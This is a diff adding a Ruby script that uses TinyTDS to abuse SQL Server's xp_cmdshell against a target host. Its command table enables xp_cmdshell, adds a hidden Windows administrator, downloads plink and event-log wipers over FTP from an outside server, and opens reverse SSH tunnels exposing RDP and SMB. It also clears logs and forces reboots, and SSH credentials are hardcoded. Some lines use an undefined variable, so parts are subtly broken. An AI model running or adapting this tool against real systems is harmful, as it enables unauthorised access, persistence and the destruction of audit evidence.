@@ -1,0 +1,241 @@
+require 'tiny_tds'
+
+
+class ReadIncFile
+
+  def initialize (filename)
+    @filename = filename
+    @valueArr = []
+  end
+
+
+  def readfile
+    begin
+    if File::exists?(@filename)
+      file = File.open(@filename,"r")
+        file.each_line do |line|
+         if !line.include? ("#")
+            @valueArr << line.strip!
+            #puts line.strip
+         end
+      end
+    end
+    rescue Exception => e
+      puts e.message
+    end
+    return @valueArr
+
+  end
+end
+
+
+
+class XpCmdShell
+
+  def initialize (ssh_server)
+    f = ReadIncFile.new('cmdshell_inc')
+    valArr = f.readfile
+
+    @strLAB_1 = valArr[0]
+    @strLAB_2 = valArr[1]
+    @strUBUNTU =valArr[2]
+    @strLAB_1_name = valArr[3]
+    @strLAB_2_name = valArr[4]
+    @strUBUNTU_name = valArr[5]
+    @strSQL_SVR_name = valArr[6]
+
+    @strWIN_USER = valArr[7]
+    @strWIN_PASSW = valArr[8]
+
+    @strFTP_IP = valArr[9]
+    @intFTP_PORT = valArr[10]
+    @strFTP_USER = valArr[11]
+    @strFTP_PASS = valArr[12]
+
+    @strSQL_USER = valArr[13]
+    @strSQL_PASS = valArr[14]
+    @strSQL_IP = valArr[15]
+    @intSQL_PORT = valArr[16]
+
+    @strTARGET_IP_3389 = valArr[17]
+    @strTARGET_IP_445 = valArr[18]
+
+
+    case ssh_server
+      when :ubuntu_ssh then
+        @strSSH_IP = @strUBUNTU
+        @intSSH_PORT = 22
+        @strSSH_USER = 'parallels'
+        @strSSH_PASS = '!dowN09'
+        @strSSH_CURRENT = "UBUNTU"
+
+      when :lab1_ssh then
+        @strSSH_IP = @strLAB_1
+        @intSSH_PORT = 22
+        @strSSH_USER = 'ssh_account'
+        @strSSH_PASS = 'ssh_pass'
+        @strSSH_CURRENT = "LAB-1"
+    end
+
+    @strSQLHASH = {
+        :makeCmdShellActive => [
+            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+        ],
+        :makeCmdShellInactive => [
+            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"
+        ],
+        :createWinAdminUser => [
+            "EXEC xp_cmdshell 'net user /add #{@strWIN_USER} #{@strWIN_PASSW}'", # login: user  password: pass
+            "EXEC xp_cmdshell 'net localgroup administrators #{@strWIN_USER} /add'"
+        ],
+        :makeUserActive =>[
+            "EXEC xp_cmdshell 'NET USER #{@strWIN_USER} /DOMAIN /ACTIVE:YES'"],
+        :makeUserInActive =>[
+            "EXEC xp_cmdshell 'NET USER #{@strWIN_USER} /DOMAIN /ACTIVE:NO'"],
+        :delWinAdminUser => [
+            "EXEC xp_cmdshell 'net user #{@strWIN_USER} /del'"],
+        :netstat => [
+            "EXEC xp_cmdshell 'netstat -an'"],
+        :dir => [
+            "EXEC xp_cmdshell 'dir c:\\'"],
+        :arp => [
+            "EXEC xp_cmdshell 'arp -a'"],
+        :ipconfig => [
+            "EXEC xp_cmdshell 'ipconfig /all'"],
+        :tree => [
+            "EXEC xp_cmdshell 'tree c:\\'"],
+        :share => [
+            "EXEC xp_cmdshell 'share'"],
+        :ftpGetPlink => [
+            "EXEC xp_cmdshell 'echo open #{@intFTP_IP} > get.txt'",
+            "EXEC xp_cmdshell 'echo #{@strFTP_USER} >> get.txt'",
+            "EXEC xp_cmdshell 'echo #{@strFTP_PASS} >> get.txt'",
+            "EXEC xp_cmdshell 'echo get plink.exe plink.exe.txt >> get.txt'",
+            "EXEC xp_cmdshell 'echo bye >> get.txt'",
+            "EXEC xp_cmdshell 'ftp -s:get.txt'",
+            "EXEC xp_cmdshell 'ren plink.exe.txt plink.exe'",
+            "EXEC xp_cmdshell 'del get.txt'"
+        ],
+        :ftpGetClearEv=> [
+            "EXEC xp_cmdshell 'echo open #{@intFTP_IP} > get.txt'",
+            "EXEC xp_cmdshell 'echo #{@strFTP_USER} >> get.txt'",
+            "EXEC xp_cmdshell 'echo #{@strFTP_PASS} >> get.txt'",
+            "EXEC xp_cmdshell 'echo get clearev.vbs clearev.txt >> get.txt'",
+            "EXEC xp_cmdshell 'echo get cleanafterme.exe cleanafterme.txt >> get.txt'",
+            "EXEC xp_cmdshell 'echo bye >> get.txt'",
+            "EXEC xp_cmdshell 'ftp -s:get.txt'",
+            "EXEC xp_cmdshell 'ren clearev.txt clearev.vbs'",
+            "EXEC xp_cmdshell 'ren cleanafterme.txt cleanafterme.exe'",
+            "EXEC xp_cmdshell 'del get.txt'"
+        ],
+        :ftpGetClearSSH => [
+            "EXEC xp_cmdshell 'echo open #{@strFTP_IP} > get.txt'",
+            "EXEC xp_cmdshell 'echo #{@strFTP_USER} >> get.txt'",
+            "EXEC xp_cmdshell 'echo #{@strFTP_PASS} >> get.txt'",
+            "EXEC xp_cmdshell 'echo get clearSSH.vbs clearSSH.txt >> get.txt'",
+            "EXEC xp_cmdshell 'echo bye >> get.txt'",
+            "EXEC xp_cmdshell 'ftp -s:get.txt'",
+            "EXEC xp_cmdshell 'ren clearSSH.txt clearSSH.vbs'",
+            "EXEC xp_cmdshell 'del get.txt'"
+        ],
+        :forward_3389_From_3389 =>[
+            "EXEC xp_cmdshell'Echo N > ssh.txt'",
+            "EXEC xp_cmdshell 'plink.exe  -N -l #{@strSSH_USER} -pw #{@strSSH_PASS} -P #{@intSSH_PORT.to_s} -R 3389:#{@strTARGET_IP_3389}:3389 #{@strSSH_IP}< ssh.txt'",
+            "EXEC xp_cmdshell 'del ssh.txt'"
+        ],
+
+        :forward_445_From_445 =>[
+            "EXEC xp_cmdshell'Echo N > ssh.txt'",
+            "EXEC xp_cmdshell 'plink.exe  -N -l #{@strSSH_USER} -pw #{@strSSH_PASS} -P #{@intSSH_PORT.to_s} -R 445:#{@strTARGET_IP_3389}:445 #{@strSSH_IP}< ssh.txt'",
+            "EXEC xp_cmdshell 'del ssh.txt'"
+        ],
+        :doClearEv => [
+            "EXEC xp_cmdshell 'cscript clearev.vbs'",
+        ],
+        :doWinRestart => [
+            "EXEC xp_cmdshell 'shutdown -r -f -t 2'", # force restart in 2 seconds
+            "EXEC xp_cmdshell 'cscript clearev.vbs'"
+        ],
+        :taskList => [ #show all running processes
+            "EXEC xp_cmdshell 'tasklist'"
+        ],
+        :taskKill => [
+            "EXEC xp_cmdshell 'taskkill /pid 2420 /f'" #change the pid when you have run tasklist
+        ],
+    }
+
+  end
+
+  def printSSHserver
+    puts "[+] SSH server IP: #{@strSSH_IP} : #{@strSSH_CURRENT}"
+  end
+
+  def printFTPserver
+    puts "[+] FTP server IP: #{@strFTP_IP} : #{@strLAB_1_name}"
+  end
+
+  def printLAB_1_server
+    puts "[+] Lab-1 server IP: #{@strLAB_1}"
+  end
+
+  def printLAB_2_server
+    puts "[+] Lab-2 server IP: #{@strLAB_2}"
+  end
+
+  def printUBUNTU_server
+    puts "[+] Ubuntu server IP : #{@strUBUNTU}"
+  end
+
+  def printMSSQL_server
+    puts "[+] MSSQL server IP : #{@strLAB_2} at #{@strLAB_2_name}"
+  end
+
+
+
+  def doCmd(cmdArr)
+
+    begin
+      client = TinyTds::Client.new(:username => @strSQL_USER, :password => @strSQL_PASS, :host => @strSQL_IP, :port => @intSQL_PORT)
+      cmdArr.each do |key|
+        puts key.to_s + ":"
+        puts '* * * * * * '
+        lineArr = @strSQLHASH[key]
+        lineArr.each do |line|
+          result = client.execute(line)
+          result.each do |row|
+            puts row.to_s[12..-3]
+            #puts row.to_s
+          end
+        end
+        puts ""
+      end
+    rescue Exception => e
+      puts e.message
+      exit
+      # puts e.backtrace.inspect
+    end
+    client.close
+  end
+
+end
+
+
+xp = XpCmdShell.new(:ubuntu_ssh)
+
+=begin
+xp.printSSHserver
+xp.printLAB_1_server
+xp.printLAB_2_server
+xp.printFTPserver
+xp.printMSSQL_server
+xp.doCmd([:dir])
+=end
+
+xp.doCmd(:forward_3389_From_3389)
+
+
+
+
+
+
+
